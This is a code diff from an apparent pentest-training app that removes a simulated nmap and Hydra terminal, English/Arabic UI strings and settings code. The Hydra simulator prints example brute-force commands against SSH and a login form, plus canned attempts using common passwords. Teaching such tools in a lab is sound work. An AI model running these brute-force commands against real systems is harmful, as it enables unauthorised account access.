-Nmap done: 256 IP addresses (3 hosts up) scanned in 2.34 seconds`;
-    } else {
-      // Basic nmap
-      result = `Starting Nmap 7.93 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.00014s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT     STATE SERVICE
-3000/tcp open  ppp
-8080/tcp open  http-proxy
-
-Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds`;
-    }
-
-    outputEl.innerHTML += result + '\n';
-    terminalEl.scrollTop = terminalEl.scrollHeight;
-  }, delay);
-}
-
-function handleHydraCommand(cmd) {
-  const outputEl = document.getElementById('hydraSimOutput');
-  const terminalEl = document.getElementById('hydraSimTerminal');
-  if (!outputEl) return;
-
-  // Print the user's command
-  outputEl.innerHTML += `\n<span style="color:#ec4899;">[user@cyber-lab ~]$</span> ${escapeHtml(cmd)}\n`;
-
-  if (cmd === 'hydra' || cmd === 'hydra --help' || cmd === 'hydra -h') {
-    outputEl.innerHTML += `Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
-
-Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
-              [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]]
-              [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET]
-              [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
-
-Options:
-  -l LOGIN   : login with LOGIN name
-  -L FILE    : load logins from FILE
-  -p PASS    : try password PASS
-  -P FILE    : load passwords from FILE
-  -C FILE    : colon separated "login:pass" format
-  -t TASKS   : run TASKS number of connects in parallel (default: 16)
-  -w TIME    : max wait time in seconds (default: 32)
-  -s PORT    : specify port
-  -f          : exit after first found login/password pair
-  -V          : verbose mode (show each attempt)
-  -v          : very verbose mode
-  -o FILE    : write found pairs to FILE
-  -e nsr     : try "n" null password, "s" login as pass, "r" reversed
-
-Supported services:
-  ssh ftp http-post-form http-get-form mysql rdp smb telnet vnc
-
-Example:
-  hydra -l admin -P passwords.txt ssh://192.168.1.1
-  hydra -l user -P pass.txt -s 8080 localhost http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
-`;
-    terminalEl.scrollTop = terminalEl.scrollHeight;
-    return;
-  }
-
-  if (!cmd.startsWith('hydra')) {
-    outputEl.innerHTML += `<span style="color:var(--danger);">Command not found. This simulator only supports 'hydra' commands. Type 'hydra' for help.</span>\n`;
-    terminalEl.scrollTop = terminalEl.scrollHeight;
-    return;
-  }
-
-  const isVerbose = cmd.includes('-V');
-  const delay = isVerbose ? 2500 : 1800;
-
-  outputEl.innerHTML += `<span id="hydraSimLoading" style="color:var(--text-muted);">Hydra starting at ${new Date().toLocaleTimeString()}...\n[DATA] Attacking target...</span>`;
-  terminalEl.scrollTop = terminalEl.scrollHeight;
-
-  setTimeout(() => {
-    const loading = document.getElementById('hydraSimLoading');
-    if (loading) loading.remove();
-
-    let result = '';
-    const timestamp = new Date().toLocaleTimeString();
-
-    if (cmd.includes('ssh://') || cmd.includes('ssh:')) {
-      const target = cmd.match(/ssh:\/\/([^\s]+)/)?.[1] || '192.168.1.1';
-      const user = cmd.match(/-l\s+(\S+)/)?.[1] || 'admin';
-      if (isVerbose) {
-        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
-[DATA] attacking ssh://${target}:22/
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "12345678" - 3 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "qwerty" - 4 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "abc123" - 5 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "monkey" - 6 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "1234567" - 7 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "letmein" - 8 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "trustno1" - 9 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "dragon" - 10 of 14344392</span>
-<span style="color:var(--success);">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
-1 of 1 target successfully completed, 1 valid password found
-Hydra finished at ${timestamp}`;
-      } else {
-        result = `[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344392 login tests
-[DATA] attacking ssh://${target}:22/
-<span style="color:var(--success);">[22][ssh] host: ${target}   login: ${user}   password: dragon</span>
-1 of 1 target successfully completed, 1 valid password found
-Hydra finished at ${timestamp}`;
-      }
-    } else if (cmd.includes('ftp://') || cmd.includes('ftp:')) {
-      const target = cmd.match(/ftp:\/\/([^\s]+)/)?.[1] || '192.168.1.1';
-      const user = cmd.match(/-l\s+(\S+)/)?.[1] || 'admin';
-      result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
-[DATA] attacking ftp://${target}:21/
-<span style="color:var(--success);">[21][ftp] host: ${target}   login: ${user}   password: admin123</span>
-1 of 1 target successfully completed, 1 valid password found
-Hydra finished at ${timestamp}`;
-    } else if (cmd.includes('http-post-form') || cmd.includes('http-get-form')) {
-      const user = cmd.match(/-l\s+(\S+)/)?.[1] || 'admin@juice-sh.op';
-      const target = cmd.match(/(?:localhost|(\d+\.\d+\.\d+\.\d+))/)?.[0] || 'localhost';
-      if (isVerbose) {
-        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
-[DATA] attacking http-post-form://${target}/
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "123456" - 1 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "password" - 2 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "admin123" - 3 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "iloveyou" - 4 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "princess" - 5 of 14344392</span>
-<span style="color:var(--text-muted);">[ATTEMPT] target ${target} - login "${user}" - pass "admin" - 6 of 14344392</span>
-<span style="color:var(--success);">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
-1 of 1 target successfully completed, 1 valid password found
-Hydra finished at ${timestamp}`;
-      } else {
-        result = `[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344392 login tests
-[DATA] attacking http-post-form://${target}/
-<span style="color:var(--success);">[80][http-post-form] host: ${target}   login: ${user}   password: admin123</span>
-1 of 1 target successfully completed, 1 valid password found
-Hydra finished at ${timestamp}`;
-      }
-    } else {
-      // Generic / unrecognized hydra flags
-      result = `[WARNING] No valid target service specified.
-[ERROR] Hydra requires a target in the format: service://host
-Example: hydra -l admin -P passwords.txt ssh://192.168.1.1
-Type 'hydra' for full usage.`;
-    }
-
-    outputEl.innerHTML += result + '\n';
-    terminalEl.scrollTop = terminalEl.scrollHeight;
-  }, delay);
-}
-
-function setTheme(theme) {
-  document.body.classList.remove('theme-hacker', 'theme-light', 'theme-pink', 'theme-default');
-  if (theme !== 'theme-default' && theme !== 'default') {
-    document.body.classList.add(theme);
-  }
-  localStorage.setItem('cybercompanion_theme', theme);
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════════
-   INTERNATIONALISATION (i18n)  —  English + Arabic
-   ═══════════════════════════════════════════════════════════════════════════════ */
-
-const TRANSLATIONS = {
-  en: {
-    // Sidebar
-    brand_sub: 'Web Pentest Lab Guide',
-    nav_modules: 'Modules',
-    btn_enter_lab: 'Enter Lab Mode',
-    btn_exit_lab: 'Exit Lab Mode',
-    btn_settings: 'Settings',
-    // Lab Panel
-    lab_panel_title: 'Lab Control Panel',
-    lab_message: 'Manage your local vulnerable targets',
-    btn_boot: 'Boot Lab',
-    btn_restart: 'Restart Lab',
-    btn_stop: 'Stop Lab',
-    btn_refresh: 'Refresh',
-    // Welcome hero
-    hero_title: 'Welcome to CyberCompanion',
-    hero_desc: 'Select a module from the sidebar to begin your Web Application Penetration Testing journey. Boot the lab environment to practice on real vulnerable applications.',
-    hero_step1: 'Choose a module',
-    hero_step2: 'Boot lab targets',
-    hero_step3: 'Follow step-by-step',
-    hero_step4: 'Learn to defend',
-    // Module section headers
-    section_concept: 'Core Concept',
-    section_analogy: 'Real-World Analogy',
-    section_steps: 'Step-by-Step Lab Exercise',
-    section_defense: 'Defense & Remediation',
-    section_reference: 'Interactive Reference Table',
-    section_challenges: 'Interactive Challenges',
-    challenge_intro: 'Put your skills to the test inside the live lab environment. You can follow an interactive step-by-step tutorial, or try to solve it on your own!',
-    // Settings modal
-    settings_title: '⚙️ Global Settings',
-    settings_language_label: '🌐 Language / اللغة',
-    settings_theme_label: 'Application Theme',
-    theme_default: 'Default (Dark)',
-    theme_hacker: 'Hacker Green',
-    theme_light: 'Light Mode',
-    theme_pink: 'Neon Pink',
-    settings_reset_title: 'Factory Reset',
-    settings_reset_desc: 'This will permanently erase all XP, achievements, and unlocked challenges. It will also destroy and rebuild the Juice Shop Docker container.',
-    settings_reset_btn: 'Wipe Everything',
-    confirm_wipe: 'Are you absolutely sure you want to wipe everything?',
-    // Module titles (sidebar)
-    mod_burp: 'Burp Suite Proxy Interception',
-    mod_sqli: 'SQL Injection (SQLi)',
-    mod_sqlmap: 'SQLmap Automation',
-    mod_nmap: 'Nmap Network Scanning',
-    mod_hydra: 'Hydra Brute-Force',
-    mod_xss: 'Cross-Site Scripting (XSS)',
-    mod_soc: 'SOC Analyst Simulator',
-    // SOC section
-    soc_title: '🛡️ Security Operations Center',
-    soc_badge: 'ACTIVE AUDIT',
-    soc_mission: 'Mission Objective',
-    soc_ioc_title: 'Indicators of Compromise (IoCs)',
-    soc_remediation_title: 'Remediation Action Required',
-    soc_locked: 'Flag a valid threat to unlock Remediation',
-    soc_intel_placeholder: 'Select a log entry to analyze IP reputation and threat score.',
-    soc_intel_title: '🌐 Threat Intel Feed',
-    soc_waf_status: 'WAF Status: Active',
-    soc_threats_mitigated: '0 Threats Mitigated',
-    soc_scenario_random: 'Random Attack (Recommended)',
-    soc_scenario_sqli: 'SQL Injection',
-    soc_scenario_xss: 'XSS Attack',
-    soc_scenario_brute: 'Brute Force',
-    soc_scenario_path: 'Path Traversal',
-    soc_scenario_cmdi: 'Command Injection',
-    soc_scenario_idor: 'IDOR (Broken Access Control)',
-    soc_scenario_ssrf: 'Server-Side Request Forgery',
-    soc_action_waf: 'Update WAF Signatures',
-    soc_action_rate: 'Rate Limit IP / Subnet',
-    soc_action_isolate: 'Isolate Host from Network',
-    soc_action_reset: 'Force Password Reset',
-    // Overlay
-    overlay_lab_dashboard: 'Lab Dashboard',
-    overlay_progress: 'Progress',
-    overlay_proxy: 'Mini Proxy',
-    overlay_level: 'Current Level',
-    overlay_challenges: 'Challenges',
-    overlay_total_xp: 'Total XP',
-    overlay_module_mastery: 'Module Mastery',
-    overlay_recent: 'Recent Activity',
-    overlay_loading: 'Loading Juice Shop...',
-    // Proxy panel
-    proxy_raw: 'Raw HTTP Request',
-    proxy_forward: 'Forward',
-    proxy_drop: 'Drop',
-    proxy_intercept_on: 'Intercept ON',
-  },
-  ar: {
-    // Sidebar
-    brand_sub: 'دليل اختبار اختراق الويب',
-    nav_modules: 'الوحدات',
-    btn_enter_lab: 'دخول وضع المختبر',
-    btn_exit_lab: 'الخروج من وضع المختبر',
-    btn_settings: 'الإعدادات',
-    // Lab Panel
-    lab_panel_title: 'لوحة التحكم في المختبر',
-    lab_message: 'إدارة الأهداف الضعيفة المحلية',
-    btn_boot: 'تشغيل المختبر',
-    btn_restart: 'إعادة تشغيل المختبر',
-    btn_stop: 'إيقاف المختبر',
-    btn_refresh: 'تحديث',
-    // Welcome hero
-    hero_title: 'مرحباً بك في CyberCompanion',
-    hero_desc: 'اختر وحدة من الشريط الجانبي لبدء رحلة اختبار اختراق تطبيقات الويب. قم بتشغيل بيئة المختبر للتدرب على التطبيقات الضعيفة الحقيقية.',
-    hero_step1: 'اختر وحدة',
-    hero_step2: 'شغّل الأهداف',
-    hero_step3: 'اتبع الخطوات',
-    hero_step4: 'تعلّم الدفاع',
-    // Module section headers
-    section_concept: 'المفهوم الأساسي',
-    section_analogy: 'تشبيه من الواقع',
-    section_steps: 'تمرين المختبر خطوة بخطوة',
-    section_defense: 'الدفاع والمعالجة',
-    section_reference: 'جدول المرجع التفاعلي',
-    section_challenges: 'التحديات التفاعلية',
-    challenge_intro: 'اختبر مهاراتك داخل بيئة المختبر المباشرة. يمكنك اتباع برنامج تعليمي تفاعلي خطوة بخطوة، أو المحاولة بمفردك!',
-    // Settings modal
-    settings_title: '⚙️ الإعدادات العامة',
-    settings_language_label: '🌐 Language / اللغة',
-    settings_theme_label: 'مظهر التطبيق',
-    theme_default: 'افتراضي (داكن)',
-    theme_hacker: 'هاكر أخضر',
-    theme_light: 'وضع فاتح',
-    theme_pink: 'وردي نيون',
-    settings_reset_title: 'إعادة ضبط المصنع',
-    settings_reset_desc: 'سيؤدي ذلك إلى مسح جميع نقاط الخبرة والإنجازات والتحديات المفتوحة بشكل دائم. كما سيتم تدمير حاوية Docker وإعادة بنائها.',
-    settings_reset_btn: 'مسح كل شيء',
-    confirm_wipe: 'هل أنت متأكد تمامًا أنك تريد مسح كل شيء؟',
-    // Module titles (sidebar)
-    mod_burp: 'اعتراض بروكسي Burp Suite',
-    mod_sqli: 'حقن SQL (SQLi)',
-    mod_sqlmap: 'أتمتة SQLmap',
-    mod_nmap: 'فحص الشبكة بـ Nmap',
-    mod_hydra: 'هجوم القوة الغاشمة بـ Hydra',
-    mod_xss: 'البرمجة النصية عبر المواقع (XSS)',
-    mod_soc: 'محاكي محلل SOC',
-    // SOC section
-    soc_title: '🛡️ مركز عمليات الأمن',
-    soc_badge: 'تدقيق نشط',
-    soc_mission: 'هدف المهمة',
-    soc_ioc_title: 'مؤشرات الاختراق (IoCs)',
-    soc_remediation_title: 'إجراء المعالجة المطلوب',
-    soc_locked: 'حدد تهديدًا صحيحًا لفتح المعالجة',
-    soc_intel_placeholder: 'اختر إدخال سجل لتحليل سمعة IP ودرجة التهديد.',
-    soc_intel_title: '🌐 موجز استخبارات التهديدات',
-    soc_waf_status: 'حالة WAF: نشط',
-    soc_threats_mitigated: '0 تهديد تم التخفيف منه',
-    soc_scenario_random: 'هجوم عشوائي (موصى به)',
-    soc_scenario_sqli: 'حقن SQL',
-    soc_scenario_xss: 'هجوم XSS',
-    soc_scenario_brute: 'القوة الغاشمة',
-    soc_scenario_path: 'اجتياز المسار',
-    soc_scenario_cmdi: 'حقن الأوامر',
-    soc_scenario_idor: 'IDOR (كسر التحكم بالوصول)',
-    soc_scenario_ssrf: 'تزوير الطلب من جانب الخادم',
-    soc_action_waf: 'تحديث توقيعات WAF',
-    soc_action_rate: 'تحديد معدل IP / الشبكة الفرعية',
-    soc_action_isolate: 'عزل المضيف عن الشبكة',
-    soc_action_reset: 'فرض إعادة تعيين كلمة المرور',
-    // Overlay
-    overlay_lab_dashboard: 'لوحة تحكم المختبر',
-    overlay_progress: 'التقدم',
-    overlay_proxy: 'بروكسي مصغر',
-    overlay_level: 'المستوى الحالي',
-    overlay_challenges: 'التحديات',
-    overlay_total_xp: 'إجمالي XP',
-    overlay_module_mastery: 'إتقان الوحدات',
-    overlay_recent: 'النشاط الأخير',
-    overlay_loading: 'جارٍ تحميل Juice Shop...',
-    // Proxy panel
-    proxy_raw: 'طلب HTTP الخام',
-    proxy_forward: 'إرسال',
-    proxy_drop: 'إسقاط',
-    proxy_intercept_on: 'الاعتراض مفعّل',
-  }
-};
-
-// Map module IDs to translation keys
-const MODULE_TITLE_KEYS = {
-  'burp-proxy': { en: 'mod_burp', ar: 'mod_burp' },
-  'sqli':       { en: 'mod_sqli', ar: 'mod_sqli' },
-  'sqlmap':     { en: 'mod_sqlmap', ar: 'mod_sqlmap' },
-  'nmap':       { en: 'mod_nmap', ar: 'mod_nmap' },
-  'hydra':      { en: 'mod_hydra', ar: 'mod_hydra' },
-  'xss':        { en: 'mod_xss', ar: 'mod_xss' },
-  'soc-simulator': { en: 'mod_soc', ar: 'mod_soc' }
-};
-
-let currentLanguage = 'en';
-window.__i18n = TRANSLATIONS.en;
-
-function t(key) {
-  return (TRANSLATIONS[currentLanguage] || TRANSLATIONS.en)[key] || TRANSLATIONS.en[key] || key;
-}
-
-function setLanguage(lang) {
-  currentLanguage = lang;
-  window.__i18n = TRANSLATIONS[lang] || TRANSLATIONS.en;
-  localStorage.setItem('cybercompanion_language', lang);
-
-  // RTL support for Arabic
-  if (lang === 'ar') {
-    document.documentElement.setAttribute('dir', 'rtl');
-    document.documentElement.setAttribute('lang', 'ar');
-  } else {
-    document.documentElement.setAttribute('dir', 'ltr');
-    document.documentElement.setAttribute('lang', 'en');
-  }
-
-  // Update all elements with data-i18n attributes
-  document.querySelectorAll('[data-i18n]').forEach(el => {
-    const key = el.getAttribute('data-i18n');
-    const text = t(key);
-    if (text) el.textContent = text;
-  });
-
-  // Update the welcome hero
-  const heroTitle = document.querySelector('.hero-title');
-  if (heroTitle) heroTitle.textContent = t('hero_title');
-  const heroDesc = document.querySelector('.hero-desc');
-  if (heroDesc) heroDesc.textContent = t('hero_desc');
-  const heroCards = document.querySelectorAll('.hero-card-text');
-  const heroKeys = ['hero_step1', 'hero_step2', 'hero_step3', 'hero_step4'];
-  heroCards.forEach((card, i) => { if (heroKeys[i]) card.textContent = t(heroKeys[i]); });
-
-  // Update sidebar module labels
-  document.querySelectorAll('#sidebarNav .nav-item').forEach(item => {
-    const idx = parseInt(item.dataset.index);
-    if (!isNaN(idx) && MODULES[idx]) {
-      const mod = MODULES[idx];
-      const key = MODULE_TITLE_KEYS[mod.id];
-      if (key) {
-        const label = item.querySelector('.nav-label');
-        if (label) label.textContent = t(key.en);
-      }
-    }
-  });
-
-  // Update overlay panel static text
-  const overlayTitle = document.querySelector('.overlay-header-title');
-  if (overlayTitle) overlayTitle.textContent = t('overlay_lab_dashboard');
-  const tabMission = document.getElementById('tabMission');
-  if (tabMission) tabMission.textContent = t('overlay_progress');
-  const tabProxy = document.getElementById('tabProxy');
-  if (tabProxy) tabProxy.textContent = t('overlay_proxy');
-  const levelLabel = document.querySelector('.level-label');
-  if (levelLabel) levelLabel.textContent = t('overlay_level');
-  const statLabels = document.querySelectorAll('.stat-label');
-  const statLabelKeys = ['overlay_challenges', 'overlay_total_xp'];
-  statLabels.forEach((lbl, i) => { if (statLabelKeys[i]) lbl.textContent = t(statLabelKeys[i]); });
-  const sectionHeadings = document.querySelectorAll('.section-heading');
-  const sectionKeys = ['overlay_module_mastery', 'overlay_recent'];
-  sectionHeadings.forEach((h, i) => { if (sectionKeys[i]) h.textContent = t(sectionKeys[i]); });
-
-  // Update loading text
-  const loadingText = document.querySelector('.webview-loading-text');
-  if (loadingText) loadingText.textContent = t('overlay_loading');
-
-  // Update proxy panel raw label
-  document.querySelectorAll('span').forEach(span => {
-    if (span.textContent.trim() === 'Raw HTTP Request' || span.textContent.trim() === 'طلب HTTP الخام') {
-      span.textContent = t('proxy_raw');
-    }
-  });
-
-  // Update Burp proxy button labels
-  const btnForward = document.getElementById('btnBurpForward');
-  if (btnForward) btnForward.textContent = t('proxy_forward');
-  const btnDrop = document.getElementById('btnBurpDrop');
-  if (btnDrop) btnDrop.textContent = t('proxy_drop');
-  const btnToggle = document.getElementById('btnBurpToggle');
-  if (btnToggle && btnToggle.textContent.includes('ON')) btnToggle.textContent = t('proxy_intercept_on');
-
-  // Update currently rendered module if any
-  if (activeModuleIndex >= 0) {
-    updateRenderedModuleSectionHeaders();
-  }
-
-  // Update SOC mode labels
-  updateSocLabels();
-}
-
-function updateRenderedModuleSectionHeaders() {
-  const sectionTitles = document.querySelectorAll('#contentArea .section-title');
-  const expectedEn = [
-    'Core Concept', 'Real-World Analogy', 'Step-by-Step Lab Exercise',
-    'Defense & Remediation', 'Interactive Reference Table', 'Interactive Challenges'
-  ];
-  const keys = [
-    'section_concept', 'section_analogy', 'section_steps',
-    'section_defense', 'section_reference', 'section_challenges'
-  ];
-
-  sectionTitles.forEach(title => {
-    const rawText = title.textContent.trim();
-    const idx = expectedEn.indexOf(rawText);
-    // check Arabic too
-    const arIdx = keys.findIndex(k => TRANSLATIONS.ar[k] === rawText);
-    const matchIdx = idx >= 0 ? idx : arIdx;
-    if (matchIdx >= 0 && keys[matchIdx]) {
-      title.textContent = t(keys[matchIdx]);
-    }
-  });
-
-  // Challenge intro text
-  const challengeIntroEl = document.querySelector('#interactiveChallengesSection .section-body > p');
-  if (challengeIntroEl) challengeIntroEl.textContent = t('challenge_intro');
-}
-
-function updateSocLabels() {
-  // SOC title
-  const socH3 = document.querySelector('#socMode .soc-header h3');
-  if (socH3) socH3.textContent = t('soc_title');
-  const socBadge = document.querySelector('#socMode .soc-badge');
-  if (socBadge) socBadge.textContent = t('soc_badge');
-  // Mission card
-  const missionH4 = document.querySelector('#socMode .mission-card h4');
-  if (missionH4) missionH4.textContent = t('soc_mission');
-  // IoC card
-  const iocH4 = document.querySelector('#socMode .ioc-card h4');
-  if (iocH4) iocH4.textContent = t('soc_ioc_title');
-  // Remediation card
-  const remH4 = document.querySelector('#socMode .remediation-card > h4');
-  if (remH4) remH4.textContent = t('soc_remediation_title');
-  // Lock text
-  const lockP = document.querySelector('#socMode .remediation-overlay p');
-  if (lockP) lockP.textContent = t('soc_locked');
-  // Threat intel feed
-  const intelTitle = document.querySelector('#socMode .soc-right .soc-header h3');
-  if (intelTitle) intelTitle.textContent = t('soc_intel_title');
-  const intelPlaceholder = document.querySelector('#threatIntelPanel p');
-  if (intelPlaceholder) intelPlaceholder.textContent = t('soc_intel_placeholder');
-  // WAF status
-  const wafH4 = document.querySelector('#wafStatusIndicator + h4');
-  if (wafH4) wafH4.textContent = t('soc_waf_status');
-  // Scenario select options
-  const socSelect = document.getElementById('socScenarioSelect');
-  if (socSelect) {
-    const optionKeys = ['soc_scenario_random','soc_scenario_sqli','soc_scenario_xss',
-      'soc_scenario_brute','soc_scenario_path','soc_scenario_cmdi',
-      'soc_scenario_idor','soc_scenario_ssrf'];
-    socSelect.querySelectorAll('option').forEach((opt, i) => {
-      if (optionKeys[i]) opt.textContent = t(optionKeys[i]);
-    });
-  }
-  // Remediation action buttons
-  const remButtons = document.querySelectorAll('#remediationActionsList .btn-soc-action');
-  const remKeys = ['soc_action_waf','soc_action_rate','soc_action_isolate','soc_action_reset'];
-  remButtons.forEach((btn, i) => { if (remKeys[i]) btn.textContent = t(remKeys[i]); });
-}
-
-function initLanguage() {
-  const saved = localStorage.getItem('cybercompanion_language');
-  if (saved && saved !== 'en') {
-    const langSelect = document.getElementById('languageSelect');
-    if (langSelect) langSelect.value = saved;
-    setLanguage(saved);
-  }
-}
-
-function initTheme() {
-  const savedTheme = localStorage.getItem('cybercompanion_theme');
-  if (savedTheme) {
-    const select = document.getElementById('themeSelect');
-    if (select) select.value = savedTheme;
-    setTheme(savedTheme);
-  }
-}
-
-async function factoryReset() {
-  localStorage.clear();
-  const btn = document.querySelector('.btn-danger-outline');
-  if (btn) {
-    btn.textContent = "Wiping Database & Restarting Container...";
-    btn.disabled = true;
-  }
-  try {
-    await window.labAPI.bootLab();
-  } catch (e) {
-    console.error('Reset error:', e);
-  }
-  window.location.reload();
-}
-
-// Init theme and language on load
-document.addEventListener('DOMContentLoaded', () => {
-  initTheme();
-  initLanguage();
-});
-
-/* ═══════════════════════════════════════════════════════════════════════════════
    EXPOSE & INITIALIZE
    ═══════════════════════════════════════════════════════════════════════════════ */
 
@@ -2795,15 +1683,15 @@ window.__app = {
   },
   formatProxyJson: () => {
     try {
-      const rawRequest = burpEditor.value.replace(/\r\n/g, '\n');
-      const parts = rawRequest.split('\n\n');
+      const rawRequest = burpEditor.value;
+      const parts = rawRequest.split('\r\n\r\n');
       if (parts.length >= 2) {
         const headerSection = parts[0];
-        const bodySection = parts.slice(1).join('\n\n');
+        const bodySection = parts.slice(1).join('\r\n\r\n');
         if (!bodySection.trim()) return;
         const parsedJson = JSON.parse(bodySection);
         const prettyJson = JSON.stringify(parsedJson, null, 2);
-        burpEditor.value = headerSection + '\n\n' + prettyJson;
+        burpEditor.value = headerSection + '\r\n\r\n' + prettyJson;
       }
     } catch (e) {
       console.warn("Could not format JSON body", e);
@@ -2813,25 +1701,14 @@ window.__app = {
   startChallenge,
   startSocSimulator,
   resumeSocSimulator,
-  submitRemediation,
-  toggleSettings,
-  toggleSidebar,
-  setTheme,
-  setLanguage,
-  factoryReset,
-  handleNmapCommand,
-  handleHydraCommand
+  submitRemediation
 };
 
 window.TUTORIALS = {};
-window.labAPI.getTutorials().then(data => {
-  window.TUTORIALS = data;
-  
-  // Refresh the current module to show newly loaded tutorials
-  if (typeof activeModuleIndex !== 'undefined') {
-    selectModule(activeModuleIndex);
-  }
-}).catch(err => console.error("Failed to load tutorials via IPC:", err));
+fetch('tutorials.json')
+  .then(res => res.json())
+  .then(data => { window.TUTORIALS = data; })
+  .catch(err => console.error("Failed to load tutorials:", err));
 
 buildSidebar();
 checkDockerInstallation();
